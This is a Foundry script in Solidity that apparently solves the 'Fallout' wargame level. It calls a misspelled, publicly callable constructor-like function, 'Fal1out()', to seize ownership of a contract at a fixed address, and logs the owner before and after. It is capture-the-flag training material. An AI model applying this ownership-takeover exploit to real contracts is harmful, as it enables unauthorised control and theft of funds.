// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    Fallout public falloutInstance = Fallout(payable(0x9a157d9924b658F515F0D744De465987e1A8583C));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Current Owner is: ", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("New Owner is: ", falloutInstance.owner());

        vm.stopBroadcast();
    }

}

